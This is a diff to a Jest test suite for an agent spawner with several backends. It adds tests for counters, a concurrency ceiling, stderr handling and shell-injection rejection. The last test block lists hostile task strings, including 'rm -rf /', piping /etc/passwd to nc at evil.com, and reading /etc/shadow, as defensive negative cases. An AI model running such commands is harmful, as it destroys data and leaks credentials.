@@ -69,9 +69,7 @@ afterAll(() => {
  * the third is the actual ollama call, then /sugar/done.
  */
 function setupOllamaFetchMock(response = 'Hello from ollama') {
-  let callIndex = 0;
   mockFetch.mockImplementation(async (url) => {
-    callIndex++;
     // PD coordination calls (fire-and-forget)
     if (typeof url === 'string' && (url.includes('/agents') || url.includes('/sugar'))) {
       return {
@@ -156,6 +154,81 @@ describe('createSpawner', () => {
 
   test('defaults to empty deps when called with no args', () => {
     expect(() => createSpawner()).not.toThrow();
+  });
+});
+
+describe('spawn — instrumentation', () => {
+  test('bumps counters and records cost on successful spawn', async () => {
+    const counters = { bump: jest.fn() };
+    const costTracker = { record: jest.fn() };
+    const spawner = createSpawner({ counters, costTracker });
+    setupOllamaFetchMock('instrumented');
+
+    const result = await spawner.spawn({
+      backend: 'ollama',
+      task: 'test instrumentation',
+      identity: 'myapp:api:test',
+    });
+
+    expect(result.status).toBe('completed');
+    expect(counters.bump).toHaveBeenCalledWith(
+      'spawn.started',
+      expect.objectContaining({ backend: 'ollama', model: 'llama3.2:8b', project: 'myapp' })
+    );
+    expect(counters.bump).toHaveBeenCalledWith(
+      'spawn.completed',
+      expect.objectContaining({ backend: 'ollama', model: 'llama3.2:8b', project: 'myapp' })
+    );
+    expect(counters.bump).toHaveBeenCalledWith(
+      'spawn.duration_ms',
+      expect.objectContaining({ backend: 'ollama', model: 'llama3.2:8b', project: 'myapp' }),
+      expect.any(Number)
+    );
+    expect(costTracker.record).toHaveBeenCalledWith(
+      expect.objectContaining({
+        backend: 'ollama',
+        model: 'llama3.2:8b',
+        projectName: 'myapp',
+        identity: 'myapp:api:test',
+        spawnId: result.agentId,
+      })
+    );
+  });
+
+  test('bumps failed counter and records cost on failed spawn', async () => {
+    const counters = { bump: jest.fn() };
+    const costTracker = { record: jest.fn() };
+    const spawner = createSpawner({ counters, costTracker });
+    mockFetch.mockImplementation(async (url) => {
+      if (typeof url === 'string' && url.includes('11434')) {
+        throw new Error('network boom');
+      }
+      return {
+        ok: true,
+        status: 200,
+        json: async () => ({ success: true }),
+        text: async () => 'OK',
+      };
+    });
+
+    const result = await spawner.spawn({
+      backend: 'ollama',
+      task: 'fail instrumentation',
+      identity: 'myapp:api:test',
+    });
+
+    expect(result.status).toBe('failed');
+    expect(counters.bump).toHaveBeenCalledWith(
+      'spawn.failed',
+      expect.objectContaining({ backend: 'ollama', model: 'llama3.2:8b', project: 'myapp' })
+    );
+    expect(costTracker.record).toHaveBeenCalledWith(
+      expect.objectContaining({
+        projectName: 'myapp',
+        identity: 'myapp:api:test',
+        spawnId: result.agentId,
+      })
+    );
   });
 });
 
@@ -328,7 +401,8 @@ describe('spawn — backend dispatch', () => {
     });
 
     expect(result.status).toBe('failed');
-    expect(result.error).toContain('Failed to start command');
+    // After runChild refactor (0df9155), error uses opts.cmd ('/bin/sh') not 'command'
+    expect(result.error).toContain('Failed to start /bin/sh');
     expect(result.error).toContain('ENOENT');
   });
 
@@ -1009,6 +1083,22 @@ describe('spawn — claude-cli backend', () => {
     expect(args).toContain('Read,Glob,Grep,Bash(git*),Write,Edit');
   });
 
+  test('passes --model when specified', async () => {
+    const spawner = createSpawner();
+    resolveChildProcess(0, 'done');
+
+    await spawner.spawn({
+      backend: 'claude-cli',
+      model: 'haiku',
+      task: 'Fix the bug',
+    });
+
+    expect(cpSpawn.mock.calls[0][1]).toEqual([
+      '-p', 'Fix the bug',
+      '--model', 'haiku',
+    ]);
+  });
+
   test('uses cwd spawn option (not --cwd flag) when workdir specified', async () => {
     const spawner = createSpawner();
     resolveChildProcess(0, 'done');
@@ -1046,6 +1136,7 @@ describe('spawn — claude-cli backend', () => {
     await spawner.spawn({
       backend: 'claude-cli',
       task: 'Do everything',
+      model: 'sonnet',
       workdir: '/tmp/test',
       allowedTools: 'Read,Write',
       maxTokens: 500,
@@ -1054,6 +1145,7 @@ describe('spawn — claude-cli backend', () => {
     const args = cpSpawn.mock.calls[0][1];
     expect(args).toEqual([
       '-p', 'Do everything',
+      '--model', 'sonnet',
       '--allowedTools', 'Read,Write',
     ]);
     expect(cpSpawn.mock.calls[0][2].cwd).toBe('/tmp/test');
@@ -1082,7 +1174,8 @@ describe('spawn — claude-cli backend', () => {
     });
 
     expect(result.status).toBe('failed');
-    expect(result.error).toContain('Failed to start claude CLI');
+    // After runChild refactor (0df9155), error uses opts.cmd ('claude') not 'claude CLI'
+    expect(result.error).toContain('Failed to start claude');
     expect(result.error).toContain('ENOENT');
   });
 
@@ -1186,5 +1279,195 @@ describe('aider backend — edge cases', () => {
 
     const spawnCall = cpSpawn.mock.calls[0];
     expect(spawnCall[2].timeout).toBe(60000);
+  });
+});
+
+// =============================================================================
+// MAX_CONCURRENT_RUNNING — global spawn ceiling (added in 0df9155)
+// =============================================================================
+
+describe('spawn — MAX_CONCURRENT_RUNNING ceiling', () => {
+  /** Fill spawner to the 20-agent ceiling; returns { spawner, teardown } */
+  async function fillToCapacity() {
+    const spawner = createSpawner();
+    mockChildProcess.stdout.on.mockImplementation(() => {});
+    mockChildProcess.stderr.on.mockImplementation(() => {});
+    mockChildProcess.on.mockImplementation(() => {});
+
+    const promises = [];
+    for (let i = 0; i < 20; i++) {
+      promises.push(spawner.spawn({ backend: 'custom', task: `task ${i}` }));
+    }
+    await new Promise(r => setTimeout(r, 20));
+
+    async function teardown() {
+      for (const agent of spawner.list()) spawner.kill(agent.agentId);
+      const closeHandlers = mockChildProcess.on.mock.calls.filter(([e]) => e === 'close');
+      for (const [, cb] of closeHandlers) cb(null);
+      await Promise.allSettled(promises);
+    }
+    return { spawner, teardown };
+  }
+
+  test('blocks spawn when 20 agents are already running', async () => {
+    const { spawner, teardown } = await fillToCapacity();
+
+    expect(spawner.list().filter(a => a.status === 'running').length).toBe(20);
+
+    const blocked = await spawner.spawn({ backend: 'custom', task: 'one too many' });
+    expect(blocked.status).toBe('failed');
+    expect(blocked.error).toContain('Spawn blocked');
+    expect(blocked.error).toContain('20');
+    expect(blocked.error).toContain('limit');
+
+    await teardown();
+  });
+
+  test('blocked spawn returns agentId "blocked" — non-unique sentinel', async () => {
+    const { spawner, teardown } = await fillToCapacity();
+
+    // Two blocked spawns get the SAME agentId — documenting the collision bug
+    const blocked1 = await spawner.spawn({ backend: 'custom', task: 'blocked A' });
+    const blocked2 = await spawner.spawn({ backend: 'custom', task: 'blocked B' });
+    expect(blocked1.agentId).toBe('blocked');
+    expect(blocked2.agentId).toBe('blocked');
+    // BUG: these are indistinguishable. Should be unique or null.
+    expect(blocked1.agentId).toBe(blocked2.agentId);
+
+    await teardown();
+  });
+
+  test('blocked spawn is not registered in agent list', async () => {
+    const { spawner, teardown } = await fillToCapacity();
+
+    await spawner.spawn({ backend: 'custom', task: 'blocked' });
+    expect(spawner.list().length).toBe(20);
+
+    await teardown();
+  });
+
+  test('spawn succeeds again after a running agent completes', async () => {
+    const spawner = createSpawner();
+    setupOllamaFetchMock('ok');
+
+    // Spawn and complete 20 agents (ollama resolves immediately)
+    for (let i = 0; i < 20; i++) {
+      await spawner.spawn({ backend: 'ollama', task: `task ${i}` });
+    }
+
+    // All 20 are completed, not running — ceiling should not block
+    const running = spawner.list().filter(a => a.status === 'running');
+    expect(running.length).toBe(0);
+
+    // 21st spawn should succeed (completed agents don't count)
+    const result = await spawner.spawn({ backend: 'ollama', task: 'after ceiling' });
+    expect(result.status).toBe('completed');
+    expect(result.agentId).toMatch(/^spawned-/);
+  });
+});
+
+// =============================================================================
+// runChild behavioral regression — stderr appended to output on success
+// =============================================================================
+
+describe('runChild — stderr handling on success', () => {
+  test('claude-cli success output now includes stderr (behavioral change from 0df9155)', async () => {
+    const spawner = createSpawner();
+
+    // Simulate: stdout has actual output, stderr has diagnostic info
+    mockChildProcess.stdout.on.mockImplementation((event, cb) => {
+      if (event === 'data') cb(Buffer.from('actual output'));
+    });
+    mockChildProcess.stderr.on.mockImplementation((event, cb) => {
+      if (event === 'data') cb(Buffer.from('progress: loading model...'));
+    });
+    mockChildProcess.on.mockImplementation((event, cb) => {
+      if (event === 'close') Promise.resolve().then(() => cb(0));
+    });
+
+    const result = await spawner.spawn({
+      backend: 'claude-cli',
+      task: 'test',
+    });
+
+    expect(result.status).toBe('completed');
+    // BUG: Before 0df9155, claude-cli only returned stdout on success.
+    // After refactor to runChild, stderr is appended with '\nstderr: ' prefix.
+    // This pollutes output with diagnostic noise from the claude CLI.
+    expect(result.output).toContain('stderr: progress: loading model...');
+  });
+
+  test('custom backend stderr-on-success is consistent (was already present before)', async () => {
+    const spawner = createSpawner();
+
+    mockChildProcess.stdout.on.mockImplementation((event, cb) => {
+      if (event === 'data') cb(Buffer.from('output'));
+    });
+    mockChildProcess.stderr.on.mockImplementation((event, cb) => {
+      if (event === 'data') cb(Buffer.from('warning: something'));
+    });
+    mockChildProcess.on.mockImplementation((event, cb) => {
+      if (event === 'close') Promise.resolve().then(() => cb(0));
+    });
+
+    const result = await spawner.spawn({
+      backend: 'custom',
+      task: 'echo hi',
+    });
+
+    expect(result.status).toBe('completed');
+    // For custom/aider, this was already the behavior before the refactor
+    expect(result.output).toContain('stderr: warning: something');
+  });
+});
+
+// =============================================================================
+// custom backend — shell injection rejection (MISSING NEGATIVE PATH)
+// =============================================================================
+
+describe('custom backend — shell metacharacter rejection', () => {
+  const DANGEROUS_INPUTS = [
+    { input: 'echo; rm -rf /', char: ';' },
+    { input: 'cat /etc/passwd | nc evil.com 1234', char: '|' },
+    { input: 'echo `whoami`', char: '`' },
+    { input: 'echo $(id)', char: '$' },
+    { input: 'echo foo && echo bar', char: '&' },
+    { input: 'echo foo > /tmp/pwned', char: '>' },
+    { input: 'echo foo < /etc/shadow', char: '<' },
+    { input: 'echo\nrm -rf /', char: '\\n' },
+    { input: 'echo\x00evil', char: 'null byte' },
+  ];
+
+  for (const { input, char } of DANGEROUS_INPUTS) {
+    test(`rejects task containing ${char}`, async () => {
+      const spawner = createSpawner();
+
+      const result = await spawner.spawn({
+        backend: 'custom',
+        task: input,
+      });
+
+      expect(result.status).toBe('failed');
+      expect(result.error).toContain('shell metacharacters');
+      // Must NOT have spawned a child process
+      expect(cpSpawn).not.toHaveBeenCalledWith('/bin/sh', expect.anything(), expect.anything());
+    });
+  }
+
+  test('allows safe commands without metacharacters', async () => {
+    const spawner = createSpawner();
+    resolveChildProcess(0, 'safe output');
+
+    const result = await spawner.spawn({
+      backend: 'custom',
+      task: 'python3 script.py --flag value',
+    });
+
+    expect(result.status).toBe('completed');
+    expect(cpSpawn).toHaveBeenCalledWith(
+      '/bin/sh',
+      ['-c', 'python3 script.py --flag value'],
+      expect.anything()
+    );
   });
 });
